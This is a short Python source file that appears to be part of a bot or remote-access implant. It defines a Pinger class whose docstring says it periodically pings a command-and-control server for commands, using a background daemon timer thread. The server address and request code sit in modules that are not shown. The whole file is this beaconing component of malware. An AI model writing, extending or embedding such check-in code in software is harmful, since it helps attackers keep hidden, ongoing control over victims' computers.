# internal imports
from utils.request_type import RequestType
from utils.repeating_timer import RepeatingTimer
from bundler.request import Request

class Pinger:
    """ A class to periodically ping the C&C server for commands. """

    def __init__(self, ping_interval):
        self.ping_interval = ping_interval

    def start(self):
        """ Sends a ping request to the server in an interval. """

        print("[Pinger] Started")
        thread = RepeatingTimer(self.ping_interval, self.ping)
        thread.daemon = True
        thread.start()

    def ping(self):
        """ Sends a ping request. """
        print("[Pinger] Pinged!")
        request = Request(RequestType.PING)
        request.send()